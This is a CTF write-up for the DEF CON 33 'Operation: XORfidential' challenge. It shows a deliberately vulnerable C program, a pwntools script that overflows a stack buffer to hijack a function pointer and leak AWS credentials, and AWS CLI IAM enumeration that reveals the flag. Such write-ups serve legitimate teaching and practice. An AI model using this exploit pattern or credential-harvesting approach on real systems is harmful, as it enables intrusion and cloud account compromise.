---
title: "Operation: XORfidential"
tags:
  - ctf
  - defcon33
  - cloud-village
  - stack
  - buffer
  - overflow
  - aws
  - binary
  - exploitation
  - reverse
  - engineering
  - docker
---

Our task is to exploit the vulnerability present in the XORfidential app and
extract its credentials. We must then use the discovered credentials to find the
flag data from H3XN0V4's cloud infrastructure. A screenshot of this challenge's
description and hints are provided below:

![operation-xorfidential](CTF%20writeups/DEFCON33/operation-xorfidential.jpeg)

## Enumeration

We inspect the H3XN0V4-VDI command line interface (CLI) and access the
XORfidential application. We are greeted with the hostname and port of the
XORfidential challenge. A screenshot is provided below:

![H3XN0V4-VDI-XORfidential-3](CTF%20writeups/DEFCON33/H3XN0V4-VDI-XORfidential-3.jpeg)

We download the challenge container image by invoking the following:

```bash
docker pull public.ecr.aws/t0j9q6v5/dev/xorfidential:latest
```

And we inspect the layers and history of the image using
[dive](https://github.com/wagoodman/dive) by invoking the following:

```bash
dive public.ecr.aws/t0j9q6v5/dev/xorfidential:latest
```

`dive` provides us the following information:

![operation-xorfidential-dive](CTF%20writeups/DEFCON33/operation-xorfidential-dive.png)

We discover that `challenge.c` is stored within this container image. The
`start.sh` script is invoked when this container starts, compiles the
`challenge` binary, and hosts the challenge on port `8888`. The contents of
`challenge.c` and `start.sh` are provided below:

### challenge.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

unsigned char master_key_encoded[] = { 0x16, 0x07, 0x00, 0x0f, 0x01, 0x0d };

struct VulnerablePayload {
    char buffer[128];
    volatile int canary;
    void (*action_ptr)();
};

void execute_priority_override() {
    char master_key_input[100] = {0};
    char decoded_master_key[100] = {0};
    const char* cipher_key_string = "CHIMERA";
    int key_len = strlen(cipher_key_string);

    printf("\a\n\n*** PRIORITY OVERRIDE ACCEPTED. MAINFRAME I/O ACTIVE. ***\n");
    printf("Enter Master Decryption Key: ");

    read(0, master_key_input, 99);
    master_key_input[strcspn(master_key_input, "\n")] = 0;

    for (int i = 0; i < sizeof(master_key_encoded); i++) {
        decoded_master_key[i] = master_key_encoded[i] ^ cipher_key_string[i % key_len];
    }

    if (strncmp(master_key_input, decoded_master_key, sizeof(master_key_encoded)) == 0) {
        printf("\n[+] MASTER KEY ACCEPTED. DECRYPTING DATASTORE...\n\n");

        FILE *fp;
        char b64_credential[200];
        const char* secret_file_path = "/opt/h3x_data/.creds";
        fp = fopen(secret_file_path, "r");

        if (fp != NULL) {
            if (fgets(b64_credential, sizeof(b64_credential), fp)) {
                b64_credential[strcspn(b64_credential, "\n")] = 0;
                printf("Leaked Datastream (AK): %s\n", b64_credential);
            }

            if (fgets(b64_credential, sizeof(b64_credential), fp)) {
                b64_credential[strcspn(b64_credential, "\n")] = 0;
                printf("Leaked Datastream (SK): %s\n", b64_credential);
            }

            fclose(fp);
        } else {
            printf("[FATAL] DATASTORE INACCESSIBLE.\n");
        }

    } else {
        printf("\n[!] INCORRECT KEY. COUNTER-INTELLIGENCE PROTOCOLS ENGAGED.\n");
    }

    printf("\n*** TRANSMISSION TERMINATED ***\n\n");
    exit(0);
}

void check_system_integrity(const char* input) { printf("[+] System integrity check... PASSED.\n"); }
void validate_user_permissions(const char* input) { printf("[+] User permissions... VALID.\n"); }

void process_secure_request(const char* initial_input) {
    struct VulnerablePayload data;

    data.canary = 0xBADBEEF1 ^ (int)initial_input[0];
    data.action_ptr = NULL;

    printf("\n[+] Security Handshake Verified. Awaiting Command...\n");
    printf("Enter Command Payload: ");

    read(0, data.buffer, 136);

    if (data.canary != (0xBADBEEF1 ^ (int)initial_input[0])) {
        printf("\n[!] TAMPERING DETECTED! CONNECTION TERMINATED.\n");
        exit(-1);
    }

    if (data.action_ptr != NULL) {
        printf("\n[+] Payload Authenticated. Executing...\n");
        data.action_ptr();
    } else {
        printf("\n[!] Payload Authentication Failed.\n");
    }
}

int main() {
    void (*function_dispatch_table[3])(const char*) = {
        &process_secure_request,
        &check_system_integrity,
        &validate_user_permissions
    };

    char initial_trigger[8];
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== H3X N0V4 Secure Kernel Interface v3.0 ===\n");
    printf("Enter Handshake Key: ");

    read(0, initial_trigger, 8);

    if (initial_trigger[0] == 'A') {
        printf("... Handshake Key Accepted. Routing to Secure Channel ...\n");
        function_dispatch_table[0](initial_trigger);
    } else {
        printf("... Invalid Handshake Key ...\n");
    }

    return 0;
}
```

### start.sh

```bash
#!/bin/sh
# /start.sh

SECRET_DIR="/opt/h3x_data"
SECRET_FILE="$SECRET_DIR/.creds"

echo "[*] Base64-encoding and staging sensitive data to secure file..."

mkdir -p "$SECRET_DIR"
chown root:ctf "$SECRET_DIR"
chmod 750 "$SECRET_DIR"

# Use `echo -n` to prevent adding a trailing newline to the variable
# before it gets Base64 encoded. This is the critical fix.
echo -n "$CHALLENGE_AWS_ACCESS_KEY_ID" | base64 -w 0 > "$SECRET_FILE"
echo "" >> "$SECRET_FILE" # Add a newline separator in the file
echo -n "$CHALLENGE_AWS_SECRET_ACCESS_KEY" | base64 -w 0 >> "$SECRET_FILE"

chown root:ctf "$SECRET_FILE"
chmod 440 "$SECRET_FILE"

echo "[*] Sensitive data staged. Permissions locked."

cd /home/ctf

echo "[*] Compiling challenge binary..."
gcc challenge.c -m32 -fno-stack-protector -no-pie -fcf-protection=none -g -o challenge
rm challenge.c
chown root:ctf challenge
chmod 755 challenge

echo "[*] Compilation complete."
echo "[*] Starting listener service on port 8888..."
exec /usr/sbin/xinetd -dontfork
```

## Evaluation

The following lines in `challenge.c` define the `VulnerablePayload` structure
used to receive user input:

```c
9 struct VulnerablePayload {
10     char buffer[128];
11     volatile int canary;
12     void (*action_ptr)();
13 };
```

The following function, `process_secure_request`, in `challenge.c` introduces a
[[stack-buffer-overflow|stack buffer overflow]] vulnerability, such that an
attacker can overwrite the `data.action_ptr` member of the `data` structure.

```c
66 void process_secure_request(const char* initial_input) {
67     struct VulnerablePayload data;
68
69     data.canary = 0xBADBEEF1 ^ (int)initial_input[0];
70     data.action_ptr = NULL;
71
72     printf("\n[+] Security Handshake Verified. Awaiting Command...\n");
73     printf("Enter Command Payload: ");
74
75     read(0, data.buffer, 136);
76
77     if (data.canary != (0xBADBEEF1 ^ (int)initial_input[0])) {
78         printf("\n[!] TAMPERING DETECTED! CONNECTION TERMINATED.\n");
79         exit(-1);
80     }
81
82     if (data.action_ptr != NULL) {
83         printf("\n[+] Payload Authenticated. Executing...\n");
84         data.action_ptr();
85     } else {
86         printf("\n[!] Payload Authentication Failed.\n");
87     }
88 }
```

If an attacker is able to successfully pass the `data.canary` check, the
attacker's provided `data.action_ptr` function pointer will be invoked by the
`challenge` process.

## Exploitation

First, we compile the `challenge` binary and extract `libc.so` and `ld-*.so`
from the container to reproduce the `challenge` process's execution environment
by invoking the following:

```bash
# Starting the container
docker run \
	--rm \
	--interactive \
	--tty \
	--entrypoint /bin/bash \
	--volume $(pwd):/tmp \
	public.ecr.aws/t0j9q6v5/dev/xorfidential:latest

# Extract challenge.c from the container
cp /home/ctf/challenge.c /tmp

# Extract start.sh from the container
cp /start.sh /tmp

# Compile challenge
gcc /home/ctf/challenge.c \
	-m32 \
	-fno-stack-protector \
	-no-pie \
	-fcf-protection=none \
	-g \
	-o

# Extract challenge from the container
cp challenge /tmp

# Extract libc.so.6 from the container
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp

# Extract ld-2.31.so from the container
cp /lib/x86_64-linux-gnu/ld-2.31.so /tmp

# Marking binaries as executable outside the container
chmod +x challenge
chmod +x ld-2.31.so
```

### solve.py

The solution script is provided below. The first payload we provide to the
target is used to pass the `trigger` check in the `main` function. We calculate
the expected `data.canary` value and deliver our stack buffer overflow payload,
overwriting the contents of `data.action_ptr` with the
`execute_priority_override` symbol.

The `challenge` process invokes the `execute_priority_override` function and
prompts the user for the master decryption key. After reverse engineering the
XOR key check in `execute_priority_override`, we calculate and respond with the
`decoded_master_key`.

After successfully passing the XOR key check, the `challenge` process responds
with an Amazon Web Services (AWS) access key and secret key.

```python
#!/usr/bin/env python3

import base64

from pwn import *

ADDR = "xorfidential-dc33.hexnova.quest"
BINARY = "./challenge"
LD = "./ld-2.31.so"
LIBC = "./libc.so.6"
PORT = 8888
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(
            [ld.path, elf.path],
            stdin=pty,
            stdout=pty,
            stderr=pty,
            env={"LD_PRELOAD": libc.path},
        )
    else:
        return remote(ADDR, PORT)


def main():
    io = conn()

    trigger = b"A\x00\x00\x00\x00\x00\x00\x00"
    io.sendafter(b"Enter Handshake Key: ", trigger)

    canary = 0xBADBEEF1 ^ trigger[0]
    payload = [
        cyclic(128, n=4),
        canary,
        elf.sym.execute_priority_override,
    ]
    io.sendafter(b"Enter Command Payload: ", flat(payload))

    master_key_encoded = b"\x16\x07\x00\x0f\x01\x0d"
    decoded_master_key = [b"\x00"] * len(master_key_encoded)
    cipher_key_string = b"CHIMERA"

    for i in range(len(master_key_encoded)):
        decoded_master_key[i] = p8(
            master_key_encoded[i] ^ cipher_key_string[i % len(cipher_key_string)]
        )
    decoded_master_key = b"".join(decoded_master_key)

    payload = [decoded_master_key, b"\x00" * (99 - len(decoded_master_key))]
    io.sendafter(b"Enter Master Decryption Key: ", flat(payload))

    io.recvuntil(b"Leaked Datastream (AK): ")
    access_key = base64.b64decode(io.recvuntil(b"\n")[:-1])
    log.success(f"Access key acquired!: {access_key}")

    io.recvuntil(b"Leaked Datastream (SK): ")
    secret_key = base64.b64decode(io.recvuntil(b"\n")[:-1])
    log.success(f"Secret key acquired!: {secret_key}")

    io.interactive()


if __name__ == "__main__":
    main()
```

### Finding the flag

Using our AWS credentials and the
[AWS command line interface (CLI)](https://aws.amazon.com/cli/), we attempt to
conduct some enumeration by invoking the following:

```bash
aws iam list-policies --scope AWS
```

We receive the following response from AWS, exposing our username,
`xorfidential-pwn-challenge-user`:

```
An error occurred (AccessDenied) when calling the ListPolicies operation: User:
arn:aws:iam::942010117876:user/xorfidential-pwn-challenge-user is not authorized
to perform: iam:ListPolicies on resource: policy path / because no
identity-based policy allows the iam:ListPolicies action
```

Recalling the hint provided in the output of the XORfidential app, we inspect
our user's Identity and Access Management (IAM) tags by invoking the following:

```bash
AWS_USERNAME='xorfidential-pwn-challenge-user'
aws iam list-user-tags --user-name $AWS_USERNAME
```

We receiving the following response from AWS, exposing a policy name within our
user's tags:

```json
{
  "Tags": [
    {
      "Key": "Hint",
      "Value": "The target policy name is a tag on this user."
    },
    {
      "Key": "TargetPolicyName",
      "Value": "xorfidential-flag-policy"
    },
    {
      "Key": "Environment",
      "Value": "prod"
    },
    {
      "Key": "Owner",
      "Value": "g0th3r"
    },
    {
      "Key": "Project",
      "Value": "xorfidential"
    }
  ]
}
```

We retrieve the policy definition and reveal the flag:

```bash
aws iam get-policy \
	--policy-arn arn:aws:iam::942010117876:policy/xorfidential-flag-policy
```

```json
{
  "Policy": {
    "PolicyName": "xorfidential-flag-policy",
    "PolicyId": "ANPA5WVBNV32ELKUVKWIE",
    "Arn": "arn:aws:iam::942010117876:policy/xorfidential-flag-policy",
    "Path": "/",
    "DefaultVersionId": "v1",
    "AttachmentCount": 0,
    "PermissionsBoundaryUsageCount": 0,
    "IsAttachable": true,
    "Description": "FLAG-{5om3timesy0uh4v370XORtoaccessBDg}",
    "CreateDate": "2025-08-02T19:50:28+00:00",
    "UpdateDate": "2025-08-02T19:50:28+00:00",
    "Tags": [
      { "Key": "Project", "Value": "xorfidential" },
      { "Key": "Environment", "Value": "prod" },
      { "Key": "Owner", "Value": "g0th3r" }
    ]
  }
}
```

## Solution

- [operation-xorfidential.tar.gz](CTF%20writeups/DEFCON33/operation-xorfidential.tar.gz)
